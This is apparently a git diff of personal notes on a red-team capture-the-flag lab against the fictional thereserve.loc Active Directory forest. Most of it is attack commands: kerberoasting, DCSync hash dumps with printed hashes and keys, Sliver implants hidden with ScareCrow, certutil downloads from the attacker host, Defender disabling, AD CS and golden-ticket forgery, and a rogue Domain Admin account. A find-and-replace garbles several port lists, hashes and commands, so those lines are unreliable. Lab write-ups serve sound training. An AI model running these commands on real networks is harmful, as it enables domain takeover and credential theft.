@@ -22,7 +22,8 @@ Learnt:
 - AD CS abuse 101
 - [Windows Loves Passwords](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2022-ps)
 - Multiple Ways means Multiple bypasses to other users
-
+- Cyber-Cold-Warfare with the rest of the community
+- RDP inception gets a bit silly - forgetting that you are connecting back on yourself for fifth layer when you already have a session  
 
 
 ![](october.png)
@@ -71,7 +72,7 @@ Message from Am03baM4n
 
 Alh4zr3d initial steps while enumerating in the background begin with `crackmapexec`.
 ```
-crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
+crackmapexec <proto> 10.200.116.0/24 -u '' -p ''
 ```
 
 ![](cme-init.png)
@@ -79,9 +80,9 @@ crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
 ![](webroot.png)
 - Aimee Walker & Patrick Edwards.
 
-Harvesting usernames http://10.200.121.13/october/index.php/demo/meettheteam -> linked to http://10.200.121.13/october/themes/demo/assets/images/ 
+Harvesting usernames http://10.200.116.13/october/index.php/demo/meettheteam -> linked to http://10.200.116.13/october/themes/demo/assets/images/ 
 ```bash
-curl http://10.200.121.13/october/themes/demo/assets/images/ -o images
+curl http://10.200.116.13/october/themes/demo/assets/images/ -o images
 cat images| cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
 echo "aimee.walker" >> users.txt
 echo "patrick.edwards" >> users.txt
@@ -204,14 +205,14 @@ While I was being to overthink the addressing part
 It is just in the vpn output. 
 
 ```bash
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000,9389 -e tun0 172.32.5.21/32
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000,9.116.-e tun0 172.32.5.21/32
 
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000,9389 -e tun0 172.32.5.22/32
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000,9.116.-e tun0 172.32.5.22/32
 # The alternative would be to try resolve over netbios 
 # 
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000 --min-rate 200 -e tun0 12.100.1.0/24 -v
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000 --min-rate 200 -e tun0 12.100.1.0/24 -v
 
-sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000 --min-rate 200 -e tun0 # -v
+sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000 --min-rate 200 -e tun0 # -v
 
 
 ```
@@ -325,10 +326,10 @@ arp -a
 Persistence just in case of other people using the same vectors
 ```go
 // For VPN
-generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
-generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
-mtls -L 10.50.116.126 -l 11011
-mtls -L 10.50.116.126 -l 11012
+generate --mtls 10.50.113.184:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.113.184:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.113.184 -l 11011
+mtls -L 10.50.113.184 -l 11012
 // Drop on VPN
 nohup ./VPN-update &
 nohup ./VPN-upgrade &
@@ -336,9 +337,9 @@ nohup ./VPN-upgrade &
 
 Setup up chisel server to handle a Dynamic Reverse Proxy 
 ```bash
-./chisel server -host 10.50.116.126 -p 20000 --reverse --socks5 -v
+./chisel server -host 10.50.113.184 -p 20000 --reverse --socks5 -v
 # On the VPN
-nohup ./chisel client 10.50.116.126:20000  R:20001:socks &
+nohup ./chisel client 10.50.113.184:20000  R:20001:socks &
 # comment sock4 ... and add to /etc/proxychains4.conf:
 socks5  127.0.0.1 20001
 ```
@@ -351,7 +352,7 @@ lisa.moore credentials have been
 
 Bloodhound run with `--dns-tcp` uses dns over tcp which works better over `proxychains`, but this did not work for Al. 
 ```go
-generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+generate beacon --mtls 10.50.113.184:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
 // ScareCrow to bypass Windows Defender - shoot fly with bozaka
 ./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
 // Deploy implant
@@ -376,13 +377,13 @@ Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/ip
 Message from Am03baM4n
 ![](messagefromAmoebaman2.png)
 ```bash
-proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.02 -u 'lisa.moore' -p 'Scientist2006'
+proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.02 -u 'lisa.moore' -p 'Scientist2006'
 ```
 
 I added 2 screenshosts to [[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc
 
 ```bash
-proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.02 -request 'corp.thereserve.loc/laura.wood'
+proxychains4 impacket-GetUserSPNs -dc-ip 10.200.116.02 -request 'corp.thereserve.loc/laura.wood'
 ```
 
 ![](kerberoastagasm.png)
@@ -517,13 +518,13 @@ john corp.spns --format=krb5tgs --wordlist=~/RedTeamCapStoneChallenge/lists/mp32
 
 Returning the day after because of work with [Al](https://www.twitch.tv/videos/1829218217), [Tyler Ramsbey Part 4](https://www.youtube.com/watch?v=qr8eGM1zhV8) and [Tyler Ramsbey Part 5](https://www.youtube.com/watch?v=FRUQMg9IhMA) in the background 
 ```bash
-proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.02 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
+proxychains4 impacket-GetUserSPNs -dc-ip 10.200.116.02 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
 # Extract usernames
 cat corp.spns | awk -F$ '{print $4}' | sed 's/*//g' >> ~/RedTeamCapStoneChallenge/lists/users.txt
 
 svcScanning : Password1!
 
-proxychains4 python3 /opt/BloodHound.py/bloodhound.y --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.02 -u 'svcScanning' -p 'Password1!'
+proxychains4 python3 /opt/BloodHound.py/bloodhound.y --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.02 -u 'svcScanning' -p 'Password1!'
 
 impacket-ticketConverter $ticket.ccache $ticket.kirbi
 
@@ -560,7 +561,7 @@ And following back along with Al once re-re-re-re-hacked to the same point and i
 [Alh4zr3d](https://www.twitch.tv/videos/1829218217) comes in with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. If 
 ```bash
 # You have local admin
-proxychains4 crackmapexec smb 10.200.119.31 -u 'svcScanning' -p 'Password1!' --lsa
+proxychains4 crackmapexec smb 10.200.116.31 -u 'svcScanning' -p 'Password1!' --lsa
 ```
 
 This was an awesome moment as it opened a lot for me to do without [Alh4zr3d](https://www.twitch.tv/videos/1829218217)
@@ -582,10 +583,10 @@ For the screenshot after multiple days.. of not press play on the VoD
 
 I DC synced to experience it and to collect the hashes.
 ```bash
-proxychains4 impacket-secretsdump -just-dc -dc-ip 10.200.119.102 corp.thereserve.loc/svcBackups@10.200.119.102 -outputfile dcsync-dump.hashes
+proxychains4 impacket-secretsdump -just-dc -dc-ip 10.200.116.102 corp.thereserve.loc/svcBackups@10.200.116.102 -outputfile dcsync-dump.hashes
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c.116.0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
 THMSetup:1008:aad3b435b51404eeaad3b435b51404ee:0ea3e204f310f846e282b0c7f9ca3af2:::
 lisa.moore:1125:aad3b435b51404eeaad3b435b51404ee:e4c1c1ba3b6dbdaf5b08485ce9cbc1cf:::
@@ -593,7 +594,7 @@ lisa.jenkins:1126:aad3b435b51404eeaad3b435b51404ee:94ef2aa6af7f6397e4164b40afb86
 charlotte.smith:1127:aad3b435b51404eeaad3b435b51404ee:1f9b5ecdf08d6f0c39a2255d99de7c6a:::
 ...
 # For just krbtgt
-proxychains4 impacket-secretsdump -just-dc-user CORP/krbtgt -dc-ip 10.200.119.102 corp.thereserve.loc/svcBackups@10.200.119.102 -outputfile dcsync-dump.hashes
+proxychains4 impacket-secretsdump -just-dc-user CORP/krbtgt -dc-ip 10.200.116.102 corp.thereserve.loc/svcBackups@10.200.116.102 -outputfile dcsync-dump.hashes
 # Generate any kerberos ticket for any account 
 0c757a3445acb94a654554f3ac529ede
 ```
@@ -646,7 +647,7 @@ With Rubeus
 // |_|   |_|____/|____/|_____)____/(___/
 
 
-// krbtgt:aes256-cts-hmac-sha1-96:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
+// krbtgt:aes256-cts-hmac-sha1-96.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
 // krbtgt:aes128-cts-hmac-sha1-96:7b3bb3c8cb4d2088bcf66834e1ee25d7
 // krbtgt:des-cbc-md5:4c7f49bc8c43ae5b
 
@@ -656,13 +657,13 @@ S-1-5-21-170228521-1485475711-3199862024-1853 : user ID, // -1853
 S-1-5-21-170228521-1485475711-3199862024 : domain SID
 
 // Inside of Sliver 
-Rubeus golden /aes256:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
+Rubeus golden /aes256.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
 ```
 
 The actual output
 ```go
 
-[server] sliver (EAGER_PUT) > rubeus golden /aes256:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
+[server] sliver (EAGER_PUT) > rubeus golden /aes256.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
 
 [*] rubeus output:
 
@@ -692,10 +693,10 @@ The actual output
 [*] Domain         : CORP.THERESERVE.LOC (CORP)
 [*] SID            : S-1-5-21-170228521-1485475711-3199862024
 [*] UserId         : 1853
-[*] Groups         : 1119,513
-[*] ServiceKey     : 899F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
+[*] Groups         : .116.513
+[*] ServiceKey     :.116.F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
 [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
-[*] KDCKey         : 899F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
+[*] KDCKey         :.116.F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
 [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
 [*] Service        : krbtgt
 [*] Target         : corp.thereserve.loc
@@ -743,7 +744,7 @@ The actual output
 
 [*] Printing a command to recreate a ticket containing the information used within this ticket
 
-c:\windows\system32\notepad.exe golden /aes256:899F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055 /user:t0_josh.sutton /id:1853 /pgid:513 /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /pwdlastset:"2/14/2023 5:40:31 AM" /minpassage:1 /displayname:"Josh Sutton" /netbios:CORP /groups:1119,513 /dc:CORPDC.corp.thereserve.loc /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+c:\windows\system32\notepad.exe golden /aes256.116.F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055 /user:t0_josh.sutton /id:1853 /pgid:513 /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /pwdlastset:"2/14/2023 5:40:31 AM" /minpassage:1 /displayname:"Josh Sutton" /netbios:CORP /groups:.116.513 /dc:CORPDC.corp.thereserve.loc /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
 ```
 
 Next thing I wanted to do is create the ultimate User from this ticket so that I am not other ruining anyone else on the network. 
@@ -756,9 +757,9 @@ We need login to the DC and dc-sync another DC as that looks normal!
 Certipy - 101 with [Alh4zr3d](https://www.twitch.tv/videos/1829218217) - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
 ```bash
 # This worked a week ago
-proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.119.102
+proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.116.102
 # This did not work
-proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.119.102
+proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.116.102
 ```
 I got this error
 ![](certipyerror.png)
@@ -784,7 +785,7 @@ svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G
 # It will always timeout the first time!
 # -target must be the AD CS server
 # -template must be the actually name not the display name 
-proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.119.102 -ns 10.200.119.102
+proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.116.102 -ns 10.200.116.102
 # First time will always timeout 
 openssl x509 -in administrator_corpdc.pfx -text -noout
 ```
@@ -793,7 +794,7 @@ DNS issues persist, but the room creator states we could do this all manually as
 ![1080](adcsexploit.png)
 
 ```bash
-proxychains4 certipy-ad auth -dc-ip 10.200.119.102 -ns 10.200.119.102 -pfx administrator_corpdc.pfx
+proxychains4 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx administrator_corpdc.pfx
 
 'administrator@corp.thereserve.loc': aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e
 ```
@@ -808,7 +809,7 @@ SChannel is a created LDAP session with a certificate.
 ```bash
 export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache
 
-proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.119.102 Administrator@CORPDC.corp.thereserve.loc
+proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.116.102 Administrator@CORPDC.corp.thereserve.loc
 ```
 ![](wmiexecontothedc.png)
 
@@ -825,10 +826,10 @@ On the DC , I understand this is not Opsec safe, but I want flags and I have tim
 ```powershell
 # Beacon Drop
 # Either via
-certutil.exe -urlcache -split -f http://10.50.116.126:8443/DC1/Word.exe Word.exe
+certutil.exe -urlcache -split -f http://10.50.113.184:8443/DC1/Word.exe Word.exe
 # or Share
 impacket-smbserver share $(pwd) -smb2support
-xcopy \\10.50.116.126\Share\Word.exe .
+xcopy \\10.50.113.184\Share\Word.exe .
 ```
 
 
@@ -889,7 +890,7 @@ Make a new Certificate with an RDP session - From [Alh4zr3d stream](https://www.
 Get it back to your box somehow
 ```bash
 certipy-ad cert -export -pfx ./admincCert.pfx -password "yourpassword" -out "unprotected.pfx"
-proxychains4 certipy-ad auth -dc-ip 10.200.119.102 -ns 10.200.119.102 -pfx unprotected.pfx
+proxychains4 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx unprotected.pfx
 ```
 
 Disable Restricted-Administrator settings to allow for RDP. Not Opsec safe if not obvious
@@ -905,13 +906,13 @@ python3 pyForgeCert.py -i $infile -pfx -p 'PasswordGoesHere' -s 'SubjectNameGoes
 Then export the certificate and authenticate
 ```bash
 certipy-ad cert -export -pfx $forgedAdmin.pfx -password "yourpassword" -out "unprotected.pfx"
-certipy-ad auth -dc-ip 10.200.119.102 -ns 10.200.119.102 -pfx unprotected.pfx
+certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx unprotected.pfx
 ```
 
 
 [Tyler](https://www.youtube.com/watch?v=xzxpn6k7OIQ) demonstrates we could also use `evil-winrm` and the hash from the dc-sync to remote into the dc through pass-the-hash 
 ```bash
-proxychains evil-winrm -i 10.200.119.102 -u Administrator -H 'd3d4edcc015856e386074795aea86b3e'
+proxychains evil-winrm -i 10.200.116.102 -u Administrator -H 'd3d4edcc015856e386074795aea86b3e'
 ```
 
 #### Catching up on Email
@@ -934,10 +935,10 @@ Domain Trust Exploitation
 
 [Tyler](https://www.youtube.com/watch?v=Td_Krk1S3yg) did:
 ```powershell
-proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.119.102
+proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.116.102
 Set-MpPreference -DisableRealTimeMonitoring $true
 impacket-smbserver share $(pwd) -smb2support
-xcopy \\10.50.116.126\Share\mimikatz.exe .
+xcopy \\10.50.113.184\Share\mimikatz.exe .
 # And kerberoasted and Exploit the domain trust.
 ```
 
@@ -989,7 +990,7 @@ IoC: `wmic` mounts and writes output to `ADMIN$` share by default.
 
 
 ```bash
-proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'NVM2' -p 'p@ssw0rd1!'
+proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.102 -u 'NVM2' -p 'p@ssw0rd1!'
 ```
 
 
@@ -1008,7 +1009,7 @@ S-1-5-21-170228521-1485475711-3199862024
 # Enterprise Admins SID
 S-1-5-21-1255581842-1300659601-3764024703-519
 # This most "normal" krbtgt hash
-dcsync-dump.hashes.ntds.kerberos:krbtgt:aes256-cts-hmac-sha1-96:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
+dcsync-dump.hashes.ntds.kerberos:krbtgt:aes256-cts-hmac-sha1-96.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
 dcsync-dump.hashes.ntds.kerberos:krbtgt:aes128-cts-hmac-sha1-96:7b3bb3c8cb4d2088bcf66834e1ee25d7
 dcsync-dump.hashes.ntds.kerberos:krbtgt:des-cbc-md5:4c7f49bc8c43ae5b
 dcsync-dump.hashes.ntds:krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
@@ -1018,7 +1019,7 @@ dcsync-dump.hashes.ntds:Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4e
 ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
 
 # Exploit the SID history
-proxychains4 impacket-ticketer -request -domain 'CORP.THERESERVE.LOC' -user 'Administrator' -hashes 'd3d4edcc015856e386074795aea86b3e:d3d4edcc015856e386074795aea86b3e' -aesKey '899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055' -nthash 0c757a3445acb94a654554f3ac529ede -domain-sid 'S-1-5-21-1255581842-1300659601-3764024703' -user-id '500' -groups '512,513,518,519,520' 'Administrator' -dc-ip 10.200.119.102 -extra-sid 'S-1-5-21-170228521-1485475711-3199862024-519'
+proxychains4 impacket-ticketer -request -domain 'CORP.THERESERVE.LOC' -user 'Administrator' -hashes 'd3d4edcc015856e386074795aea86b3e:d3d4edcc015856e386074795aea86b3e' -aesKey .116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055' -nthash 0c757a3445acb94a654554f3ac529ede -domain-sid 'S-1-5-21-1255581842-1300659601-3764024703' -user-id '500' -groups '512,513,518,519,520' 'Administrator' -dc-ip 10.200.116.102 -extra-sid 'S-1-5-21-170228521-1485475711-3199862024-519'
 # PreAuth failed - possibly some hash value has been altered.
 
 .\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519
@@ -1118,7 +1119,7 @@ PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt"))
 Create cross-trust golden ticket
 ```powershell
 # mimikatz
-kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:1337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt [/startoffset:-10 /endin:60 /renewmax:10080]
+kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:1337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-12.116.7427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt [/startoffset:-10 /endin:60 /renewmax:10080]
 ```
 
 DC Sync - this went wrong because I am not targeting the correct domains
@@ -1164,11 +1165,11 @@ Sliver Expansion prep
 ```bash
 mkdir ROOTDC JMP BANKDC
 
-generate beacon -m 10.50.116.126:11015 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin
-generate beacon -m 10.50.116.126:11016 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/JMP/JMP.bin
-generate beacon -m 10.50.116.126:11017 -b http://10.50.116.126:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin
+generate beacon -m 10.50.113.184:11015 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin
+generate beacon -m 10.50.113.184:11016 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/JMP/JMP.bin
+generate beacon -m 10.50.113.184:11017 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin
 # ScareCrow
-sudo chown -R kali:kali * && chmod +x *
+sudo chown -R kali:kali * && chmod +rx *
 
 /opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin -Loader binary -domain google.com -obfu -Evasion KnownDLL 
 /opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
@@ -1178,9 +1179,9 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 # UPX!
 upx *
 
-mtls -L 10.50.116.126 -l 11015
-mtls -L 10.50.116.126 -l 11016
-mtls -L 10.50.116.126 -l 11017
+mtls -L 10.50.113.184 -l 11015
+mtls -L 10.50.113.184 -l 11016
+mtls -L 10.50.113.184 -l 11017
 ```
 
 While I recompile everything again re-watched the talk discussed in the SWIFT compromise section and this [Jake's Emulating the Adversary in Post-Exploitation at SANs Hackfest & Ranges Summit 2020](https://www.youtube.com/watch?v=VctxgiEoDUU). 
@@ -1221,22 +1222,25 @@ Firstly a realisation already expressed that I failed to handle the domains corr
 
 ```powershell
 import-module ActiveDirectory
-New-ADUser -Name 'NVM2'
-Set-ADAccountPassword -Identity NVM2 -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
-Add-ADGroupMember -Identity "Domain Admins" -Members "NVM2"
-Enable-ADAccount -Identity NVM2
-net localgroup "Administrators" NVM2 /add 
-gpupdate /force'
+New-ADUser -Name 'NVM'
+Set-ADAccountPassword -Identity NVM -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
+Add-ADGroupMember -Identity "Domain Admins" -Members "NVM"
+Enable-ADAccount -Identity NVM
+net localgroup "Administrators" NVM /add 
+gpupdate /force
 
-proxychains4 evil-winrm -u NVM2 -p 'p@ssw0rd1!' -i 10.200.119.102
+proxychains4 evil-winrm -u NVM -p 'p@ssw0rd1!' -i 10.200.116.102
 Set-MpPreference -DisableRealTimeMonitoring $true
 # For some reason certutil did not work so bitsadmin with altered syntax from the LOLBAS
 # Which also does not worked but broke the webserver I was hosting it for some reason
-bitsadmin.exe /transfer NewUpdate /Download /priority High http://10.50.116.126:8443/DC1/OneDrive.exe c:\programdata\NVM\OneDrive.exe
+bitsadmin.exe /transfer NewUpdate /Download /priority High http://10.50.113.184:8443/DC1/OneDrive.exe c:\programdata\NVM\OneDrive.exe
 # So just
+mkdir C:\programdata\nvm
 upload /home/kali/RedTeamCapStoneChallenge/Tools/Tools/PowerView/PowerView.ps1 C:\programdata\NVM\PowerView.ps1
 upload /home/kali/RedTeamCapStoneChallenge/Tools/mimikatz.zip C:\programdata\NVM\mimikatz.zip
 upload /home/kali/RedTeamCapStoneChallenge/Tools/kekeo.zip C:\programdata\NVM\kekeo.zip
+upload /home/kali/RedTeamCapStoneChallenge/Tools/Invoke-SMBExec.ps1 C:\programdata\NVM\Invoke-SMBExec.ps1
+
 upload /home/kali/RedTeamCapStoneChallenge/Tools/DC1/OneDrive.exe C:\programdata\NVM\OneDrive.exe
 expand-archive .\mimikatz.zip
 expand-archive .\kekeo.zip
@@ -1250,10 +1254,21 @@ Start-Process C:\programdata\NVM\OneDrive.exe -WindowStyle Hidden
 
 Get-ADComputer -Identity "CORPDC"
 # S-1-5-21-170228521-1485475711-3199862024-1009
+# S-1-5-21-170228521-1485475711-3199862024-1009
 Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
 # S-1-5-21-1255581842-1300659601-3764024703-519
+# S-1-5-21-1255581842-1300659601-3764024703-519
+cd C:\programdata\nvm\mimikatz\x64\
+.\mimikatz.exe
+# Mimkatz 
+# Remember to cycle through exfil and catagorise for data handling
+privilege::debug
+log
+token::elevate
+!+
 
 lsadump::dcsync /user:corp\krbtgt
+#  0c757a3445acb94a654554f3ac529ede
 #  0c757a3445acb94a654554f3ac529ede
 # Altered From https://tryhackme.com/room/exploitingad
 kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
@@ -1270,22 +1285,194 @@ Then first golden ticket creation
 ![](goldenticketnumone.png)
 Unfortunately this did not work for me possibly the other user on my lab network is using a different forge ticket to impersonate the administrator user and then psexecing into the rootdc or bankdc. I am being blocked by another user almost certainly. 
 
-Preemptive Chisel organisation
-``` bash
-# VPN - proxying throuugh and back
-nohup ./chisel client 10.50.116.126:20000 20001:127.0.0.1:20000 &
-# Open 20002 on VPN for CORPDC 
-nohup ./chisel client 10.50.116.126:20000 20002:127.0.0.1:port &
-# CORPDC 
-nohup ./chisel client 10.200.119.12:20002 R:127.0.0.1:20002:socks &
+Prepping everything to power-through to dropping beacons on both `rootdc`, `jmp` and `bankdc` before anyone can block the way. It also seems like everyone is using the same way in.
+```powershell
+# Players changed a hash, beware
+# Got hash for 'administrator@corp.thereserve.loc': # 
+# aad3b435b51404eeaad3b435b51404ee:b199b5002b300e97a0d75cb18c0a43c0
 
+import-module ActiveDirectory
+New-ADUser -Name 'NVM'
+Set-ADAccountPassword -Identity NVM -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
+Add-ADGroupMember -Identity "Domain Admins" -Members "NVM"
+Enable-ADAccount -Identity NVM
+net localgroup "Administrators" NVM /add 
+gpupdate /force
+
+cd 
+proxychains4 evil-winrm -u NVM -p 'p@ssw0rd1!' -i 10.200.116.102
+Set-MpPreference -DisableRealTimeMonitoring $true
+
+
+mkdir c:\programdata\nvm
+upload /home/kali/RedTeamCapStoneChallenge/Tools/Tools/PowerView/PowerView.ps1 C:\programdata\NVM\PowerView.ps1
+upload /home/kali/RedTeamCapStoneChallenge/Tools/mimikatz.zip C:\programdata\NVM\mimikatz.zip
+upload /home/kali/RedTeamCapStoneChallenge/Tools/kekeo.zip C:\programdata\NVM\kekeo.zip
+upload /home/kali/RedTeamCapStoneChallenge/Tools/DC1/OneDrive.exe C:\programdata\NVM\OneDrive.exe
+
+netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\programdata\NVM\OneDrive.exe" enable=yes
